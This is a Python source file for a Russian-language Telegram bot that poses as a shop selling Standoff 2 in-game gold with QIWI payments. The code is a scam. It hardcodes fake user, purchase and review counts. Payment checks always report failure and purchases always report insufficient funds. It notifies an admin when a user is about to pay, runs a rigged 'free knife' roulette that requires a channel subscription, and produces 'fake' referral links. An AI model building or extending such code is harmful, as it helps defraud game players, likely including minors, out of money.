from telebot import *
import time
from pyqiwip2p import QiwiP2P
from keyboard import *
from config import *

p2p = QiwiP2P(auth_key=QIWI_PRIV_KEY)

bot = telebot.TeleBot(token)




@bot.message_handler(commands=['sosi', 'admin'])
def admin(message):
    azurecode = open(filemesto, "r")
    promokodz = azurecode.read()
    if message.chat.id not in admins:
        return bot.send_message(message.chat.id, "Пиши по русски, блять...")
    bot.send_message(message.chat.id, f"Админ панель\nТекущий промокод:{promokodz}", reply_markup=menuAdmin)

@bot.message_handler(commands=["start"])
def start(message):
    azurecode = open(filemesto, "r")
    promokodz = azurecode.read()
    bot.send_message(message.chat.id, f'Добро пожаловать в бота по продаже голды в игре standoff 2!\nВы вошли по ссылке реферала.\nПромокод для новичков: {promokodz}', reply_markup=menuUser)
@bot.message_handler(content_types=['text'])
def dialogue(message):
    if message.text == "👤Профиль":
        bot.send_message(message.chat.id, f"💰Баланс: 0 руб\n" 
                                          f"🧿юзернейм: @{message.chat.username}\n" 
                                          f"🆔Ваш id: {message.chat.id}\n"
                         , reply_markup=sendReq)
    elif message.text == "⁉Помощь":
         bot.send_message(message.chat.id,'Если у вас возникли какие либо проблемы с покупкой\n'
                                          'наш отзывчивый саппорт вам всегда поможет!', reply_markup=support)
    elif message.text == "🔥Покупка":
        bot.send_message(message.chat.id, 'Выберите интересующий вас товар:\n',reply_markup=buy)

    elif message.text == "📊О боте":
        bot.send_message(message.chat.id, '🗣Всего пользователей:49512\n'
                                          '💸Всего покупок:39681\n'
                                         '🌀Всего отзывов: 19482\n')
    elif message.text == "📕Вопросы":
        bot.send_message(message.chat.id, '📌Добавите ли вы больше способов оплаты?\n'
                                          'Да, мы работаем над этим.\n\n'
                                          '📌Почему такие низние цены?\n'
                                          'Мы скупаем голду оптом, и продает чуть дороже.\n\n'
                                          '📌Что делать, если не получил товар?\n'
                                          'В таком случае, просим отписать поддержке в разделе: Помощь.\n')
    elif message.text == "⚡️Бесплатный Нож⚡️":
        bot.send_message(message.chat.id,"Крутим барабан.")
        time.sleep(2)
        bot.send_message(message.chat.id, "Вам выпала нож бабочка\nчтобы забрать ее нужно подписаться на канал", reply_markup=freeknifebuttons)
    else:
        bot.send_message(message.chat.id, "Не понимаю..", reply_markup=menuUser)

@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data == "send":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id, text="Выберите сумму пополнения:",reply_markup=oplata )
    elif call.data == "buytap100":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id, text="Данный товар стоит 100р,вы уверены, что хотите его приобрести?",reply_markup=done )
    elif call.data == "buytap150":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id,text="Данный товар стоит 150р,вы уверены, что хотите его приобрести?", reply_markup=done)
    elif call.data == "buytap300":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id,text="Данный товар стоит 300р,вы уверены, что хотите его приобрести?",reply_markup=done)
    elif call.data == "buytap1000":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id,text="Данный товар стоит 1000р,вы уверены, что хотите его приобрести?",reply_markup=done)
    elif call.data == "cancelbuy":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id, text="Покупка отменена.")
    elif call.data == "donebuy":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(chat_id=call.message.chat.id, text="У вас не хватает средств. Пополните баланс в профиле.",reply_markup=menuUser )
    elif call.data == "check":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        time.sleep(1)
        bot.send_message(chat_id=call.message.chat.id, text="Платеж не совершен.")
    elif call.data == "oplata100":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_chat, f"Пользователь @{call.message.chat.username} собирается пополнять.\n" )
        bot.send_message(chat_id=call.message.chat.id, text="Перейдите по ссылке, для оплаты через QIWI.",reply_markup=oplatalinks100)
    elif call.data == "oplata150":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_chat, f"Пользователь @{call.message.chat.username} собирается пополнять.\n" )
        bot.send_message(chat_id=call.message.chat.id, text="Перейдите по ссылке, для оплаты через QIWI.",reply_markup=oplatalinks150)
    elif call.data == "oplata300":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_chat, f"Пользователь @{call.message.chat.username} собирается пополнять.\n" )
        bot.send_message(chat_id=call.message.chat.id, text="Перейдите по ссылке, для оплаты через QIWI.",reply_markup=oplatalinks300)
    elif call.data == "oplata1000":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_chat, f"Пользователь @{call.message.chat.username} собирается пополнять.\n" )
        bot.send_message(chat_id=call.message.chat.id, text="Перейдите по ссылке, для оплаты через QIWI.",reply_markup=oplatalinks1000)
    elif call.data == "promokod":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return promo(call.message)
    elif call.data == "fakeref":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return fakeref1(call.message)
    elif call.data == "cancel":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return admin(call.message)
    elif call.data == "gotostart":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return start(call.message)
    elif call.data == "editpromocode":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return editpromocode(call.message)
    elif call.data == "link_proverka":
        bot.send_message(call.message.chat.id, "Вы не подписанны")

@bot.message_handler(commands=["promo"])
def promo(message):
    bot.send_message(message.chat.id, 'Введите ваш промокод:\n')
    bot.register_next_step_handler(message, promok)

@bot.message_handler(commands=["promok"])
def promok(message):
    azurecode = open(filemesto, "r")
    promokodz = azurecode.read()
    if message.text == f"{promokodz}":
     bot.send_message(admin_chat, f'Пользователь @{message.chat.username} ввел промокод.')
     bot.send_message(message.chat.id, f'Успешно! Вам начислится {summapromo} рублей на баланс при следующем пополнении на любую сумму.\n')
    else:
     bot.send_message(message.chat.id, 'Не могу найти такой промокод!\n', reply_markup=menuUser)

@bot.message_handler(commands=["fakeref1"])
def fakeref1(message):
    bot.send_message(message.chat.id, 'Ваш фейк:\n'
                                      f'http://t.me/{ref}?ref={message.chat.id}', reply_markup=cancel)

@bot.message_handler(commands=["editpromocodes_azure"])
def editpromocode(message):
    bot.send_message(message.chat.id, "Введите новый промокод:")
    bot.register_next_step_handler(message, editpromocodea)

@bot.message_handler(commands=["freeknife_azure1"])
def freeknife(message):
    bot.send_message(message.chat.id,"Крутим барабан.")
    time.sleep(1)
    bot.delete_message(message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "КРУТИМ БАРАБАН")
    time.sleep(2)
    bot.delete_message(message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "К Р У Т И М Б А Р А Б А Н")
    time.sleep(4)
    bot.delete_message(message.message.chat.id, message.message.message_id)
    bot.send_photo(message.chat.id, photo=photo_url, caption="Вам выпала нож бабочка\nчтобы забрать ее нужно подписаться на канал", reply_markup=freeknifebuttons)


@bot.message_handler(content_types=["text"])
def editpromocodea(message):
    promokodz = message.text
    promocodefile = open(filemesto, "w")
    promocodefile.write(str(promokodz)) # не менять на message.text не будет работать
    promocodefile.close()
    bot.send_message(message.chat.id, f"Текущий промокод:{promokodz}\n Если он не изменился пробуйте изменить его снова.")



bot.infinity_polling()
